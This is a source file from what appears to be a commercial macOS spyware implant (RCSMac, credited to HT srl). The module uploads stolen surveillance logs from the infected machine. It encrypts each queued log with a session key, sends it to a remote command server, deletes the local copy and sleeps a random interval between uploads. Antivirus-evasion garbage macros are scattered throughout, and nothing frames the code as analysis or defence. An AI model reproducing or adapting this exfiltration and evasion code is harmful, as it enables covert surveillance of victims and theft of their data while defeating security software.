/*
 * RCSMac - Log Upload Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */
#import "RCSMCommon.h"

#import "LogNetworkOperation.h"

#import "LogNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "FSNetworkOperation.h"
#import "RCSMLogManager.h"
#import "RCSMDiskQuota.h"

#import "NSString+SHA1.h"
#import "NSData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@interface LogNetworkOperation (private)

- (BOOL)_sendLogContent: (NSData *)aLogData;

@end

@implementation LogNetworkOperation (private)

- (BOOL)_sendLogContent: (NSData *)aLogData
{
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (aLogData == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002    
      
      return NO;
    }
  
  uint32_t command              = PROTO_LOG;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  
  //
  // message = PROTO_LOG | log_size | log_content | sha
  //
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  uint32_t dataSize             = [aLogData length];
  [commandData appendBytes: &dataSize
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [commandData appendData: aLogData];
  
  NSData *commandSha            = [commandData sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
#ifdef DEBUG_LOG_NOP
  verboseLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (replyData == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }

  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // remove padding
  [replyDecrypted removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_000
    
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      return NO;
    }
   
  if (command != PROTO_OK)
    {
      // AV evasion: only on release build
      AV_GARBAGE_007
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return YES;
}

@end


@implementation LogNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
               minDelay: (uint32_t)aMinDelay
               maxDelay: (uint32_t)aMaxDelay
              bandwidth: (uint32_t)aBandwidth
{
  if (self = [super init])
    {
      mTransport = aTransport;
      
      mMinDelay           = aMinDelay;
      mMaxDelay           = aMaxDelay;
      mBandwidthLimit     = aBandwidth;
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      return self;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  //
  // Close active logs and move them to the send queue
  //
  if ([logManager closeActiveLogsAndContinueLogging: TRUE] == YES)
    {
#ifdef DEBUG_LOG_NOP
      infoLog(@"Active logs closed correctly");
#endif
    }
  else
    {
#ifdef DEBUG_LOG_NOP
      errorLog(@"An error occurred while closing active logs (non-fatal)");
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
  id anObject;
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (enumerator == nil)
    {
#ifdef DEBUG_LOG_NOP
      warnLog(@"No logs in queue, searching on local folder");
#endif
    }
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      //
      // Send all the logs in the send queue
      //
      while (anObject = [enumerator nextObject])
        {
          [anObject retain];
          
          NSString *logName = [[anObject objectForKey: @"logName"] copy];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
            {
              // AV evasion: only on release build
              AV_GARBAGE_008
            
              NSData *logContent  = [NSData dataWithContentsOfFile: logName];
              
              // AV evasion: only on release build
              AV_GARBAGE_007
              
              //
              // Send log
              //
              BOOL retVal = [self _sendLogContent: logContent];
              
              if (retVal == NO)
              {
                [logName release];
                [anObject release];
                break;
              }
              
              // AV evasion: only on release build
              AV_GARBAGE_000
              
              NSString *logPath = [[anObject objectForKey: @"logName"] retain];
              
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              if ([[NSFileManager defaultManager] removeItemAtPath: logPath
                                                             error: nil] == NO)
                {
#ifdef DEBUG_LOG_NOP
                  errorLog(@"Error while removing (%@) from fs", logPath);
#endif
                }
              else
                {
                  // decrement Quota disk
                  [[__m_MDiskQuota sharedInstance] decUsed: [logContent length]];
                }
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              [logPath release];
            }
            
          [logName release];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          //
          // Remove log entry from the send queue
          //
          [logManager removeSendLog: [[anObject objectForKey: @"agentID"] intValue]
                          withLogID: [[anObject objectForKey: @"logID"] intValue]];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          //
          // Sleep as specified in configuration
          //
          if (mMaxDelay > 0)
            {
              // AV evasion: only on release build
              AV_GARBAGE_001
            
              srand(time(NULL));
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              int sleepTime = rand() % (mMaxDelay - mMinDelay) + mMinDelay;
              
              // AV evasion: only on release build
              AV_GARBAGE_002
              
              sleep(sleepTime);
            }
          else
            {
              // AV evasion: only on release build
              AV_GARBAGE_009
            
              usleep(300000);
            }
          
          [anObject release];
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}
  
@end
